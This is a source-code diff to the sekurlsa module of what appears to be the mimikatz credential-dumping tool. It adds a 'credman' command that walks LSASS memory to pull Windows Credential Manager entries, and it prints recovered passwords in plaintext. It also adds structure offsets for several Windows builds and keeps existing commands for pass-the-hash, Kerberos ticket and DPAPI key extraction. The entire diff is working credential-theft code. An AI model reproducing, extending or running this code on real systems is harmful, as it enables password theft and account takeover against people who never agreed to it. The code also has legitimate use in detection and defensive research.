@@ -21,6 +21,7 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_msv_pth,			L"pth",		L"Pass-the-hash"},
 	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
 	{kuhl_m_sekurlsa_dpapi,				L"dpapi",	L"List Cached MasterKeys"},
+	{kuhl_m_sekurlsa_credman,			L"credman",	L"List Credentials Manager"},
 };
 
 const KUHL_M kuhl_m_sekurlsa = {
@@ -36,13 +37,16 @@ const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
 	&kuhl_m_sekurlsa_kerberos_package,
 	&kuhl_m_sekurlsa_ssp_package,
 	&kuhl_m_sekurlsa_dpapi_svc_package,
+	&kuhl_m_sekurlsa_credman_package,
 };
 
 const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
-	{sizeof(KIWI_MSV1_0_LIST_5) , FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_5, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_5 , pSid)},
-	{sizeof(KIWI_MSV1_0_LIST_6) , FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_6, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_6 , pSid)},
-	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid)},
-	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid)}
+	{sizeof(KIWI_MSV1_0_LIST_51), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_51, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_52), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_52, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager)},
+	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager)},
 };
 
 const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
@@ -255,11 +259,10 @@ BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMA
 	ULONG i;
 	for(i = 0; i < sizeof(lsassPackages) / sizeof(PKUHL_M_SEKURLSA_PACKAGE); i++)
 	{
-		if(/*lsassPackages[i]->isValid &&*/ (_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0))
+		if(_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
 		{
 			lsassPackages[i]->Module.isPresent = TRUE;
 			lsassPackages[i]->Module.Informations = *pModuleInformation;
-			break;
 		}
 	}
 	return TRUE;
@@ -281,14 +284,18 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 		sessionData.cLsass = &cLsass;
 		sessionData.lsassLocalHelper = lsassLocalHelper;
 
-		if(cLsass.osContext.MajorVersion < 6)
+		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)
 			helper = &lsassEnumHelpers[0];
-		else if(cLsass.osContext.MinorVersion < 2)
+		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_VISTA)
 			helper = &lsassEnumHelpers[1];
-		else if(cLsass.osContext.MinorVersion < 3)
+		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_7)
 			helper = &lsassEnumHelpers[2];
-		else
+		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_8)
 			helper = &lsassEnumHelpers[3];
+		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
+			helper = &lsassEnumHelpers[4];
+		else
+			helper = &lsassEnumHelpers[5];
 
 		securityStruct.hMemory = cLsass.hLsassMem;
 		securityStruct.address = LogonSessionListCount;
@@ -320,6 +327,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 							sessionData.LogonDomain	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToDomain);
 							sessionData.pCredentials= *(PVOID *)		((PBYTE) aBuffer.address + helper->offsetToCredentials);
 							sessionData.pSid		= *(PSID *)			((PBYTE) aBuffer.address + helper->offsetToPSid);
+							sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper->offsetToCredentialManager);
 
 							kull_m_string_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
 							kull_m_string_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
@@ -355,7 +363,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LO
 			if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
 			{
 				kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
-				pLsassData->lsassPackages[i]->CredsForLUIDFunc(&cLsass, pData->LogonId, pData->pCredentials, pLsassData->externalCallback, pLsassData->externalCallbackData);
+				pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData, pLsassData->externalCallback, pLsassData->externalCallbackData);
 				kprintf(L"\n");
 			}
 		}
@@ -484,9 +492,13 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						, username, domain);
 
 					if(!password || kull_m_string_suspectUnicodeString(password))
-						kprintf(L"%wZ", password);
-					else 
-						kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
+					{
+						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
+							kprintf(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
+						else
+							kprintf(L"%wZ", password);
+					}
+					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
 				}
 
 				LocalFree(mesCreds->UserName.Buffer);
